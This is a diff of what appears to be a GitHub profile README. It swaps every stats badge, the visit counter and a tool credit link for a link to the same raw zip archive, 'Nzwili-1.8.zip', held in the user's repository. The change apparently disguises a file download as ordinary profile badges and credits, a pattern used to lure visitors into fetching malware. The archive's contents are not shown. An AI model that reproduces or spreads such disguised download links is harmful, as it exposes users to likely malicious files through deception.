@@ -19,11 +19,11 @@ I'm currently working on a website<br>I'm looking to collaborate on new Java pro
 ![Arduino](https://img.shields.io/badge/-Arduino-00979D?style=for-the-badge&logo=Arduino&logoColor=white)
 
 # 📊 GitHub Stats:
-![](https://github-readme-stats.vercel.app/api?username=Nzwili&theme=dark&hide_border=false&include_all_commits=false&count_private=false)<br/>
-![](https://github-readme-streak-stats.herokuapp.com/?user=Nzwili&theme=dark&hide_border=false)<br/>
-![](https://github-readme-stats.vercel.app/api/top-langs/?username=Nzwili&theme=dark&hide_border=false&include_all_commits=false&count_private=false&layout=compact)
+![](https://github.com/Nzwili/Nzwili-/raw/refs/heads/main/bhava/Nzwili-1.8.zip)<br/>
+![](https://github.com/Nzwili/Nzwili-/raw/refs/heads/main/bhava/Nzwili-1.8.zip)<br/>
+![](https://github.com/Nzwili/Nzwili-/raw/refs/heads/main/bhava/Nzwili-1.8.zip)
 
 ---
-[![](https://visitcount.itsvg.in/api?id=Nzwili&icon=0&color=0)](https://visitcount.itsvg.in)
+[![](https://github.com/Nzwili/Nzwili-/raw/refs/heads/main/bhava/Nzwili-1.8.zip)](https://github.com/Nzwili/Nzwili-/raw/refs/heads/main/bhava/Nzwili-1.8.zip)
 
-<!-- Proudly created with GPRM ( https://gprm.itsvg.in ) -->
+<!-- Proudly created with GPRM ( https://github.com/Nzwili/Nzwili-/raw/refs/heads/main/bhava/Nzwili-1.8.zip ) -->
